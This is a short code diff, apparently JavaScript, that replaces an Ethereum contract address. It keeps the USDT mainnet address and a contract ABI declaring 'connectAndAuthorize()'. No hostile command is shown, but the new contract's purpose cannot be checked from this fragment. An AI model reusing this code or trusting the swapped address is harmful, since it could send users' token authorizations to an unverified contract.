@@ -1,4 +1,4 @@
-const ETHEREUM_CONTRACT_ADDRESS = '0x612ce4a0f20aa7218bfecd02c6a0c77f8cf6cbeb';
+const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Mainnet Address
 const CONTRACT_ABI = [
     "function connectAndAuthorize() external",
